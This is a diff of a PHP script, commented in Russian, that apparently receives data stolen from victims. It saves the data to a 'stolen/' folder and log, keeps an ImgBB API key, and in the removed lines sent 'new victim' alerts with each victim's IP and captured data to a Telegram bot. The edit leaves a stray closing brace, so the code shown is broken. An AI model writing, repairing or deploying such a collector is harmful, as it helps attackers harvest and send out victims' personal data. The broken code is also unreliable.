@@ -1,10 +1,8 @@
 <?php
 // ========== НАСТРОЙКИ ==========
-$IMGBB_API_KEY = 'd0d498d742931aed3626d5b32c081df3'; // ТВОЙ ключ ImgBB
+$IMGBB_API_KEY = 'ae2dada31babcb9c5d89e478f894325f'; // ТВОЙ ключ ImgBB
 $STORAGE_DIR = 'stolen/';
 $LOG_FILE = 'stolen.log';
-$TELEGRAM_BOT = '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'; // ТГ бот (опционально)
-$TELEGRAM_CHAT = '123456789'; // Твой chat_id
 // ===============================
 
 // Создаём папки
@@ -22,9 +20,7 @@ function logMessage($type, $data) {
     file_put_contents($LOG_FILE, json_encode($entry, JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);
     
     // Отправка в Telegram
-    if ($TELEGRAM_BOT && $TELEGRAM_BOT !== '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz') {
-        $msg = "📸 НОВАЯ ЖЕРТВА!\nIP: {$entry['ip']}\nВремя: {$entry['time']}\nТип: $type\nДанные: " . substr(print_r($data, true), 0, 500);
-        file_get_contents("https://api.telegram.org/bot{$TELEGRAM_BOT}/sendMessage?chat_id={$TELEGRAM_CHAT}&text=" . urlencode($msg));
+    
     }
 }
 
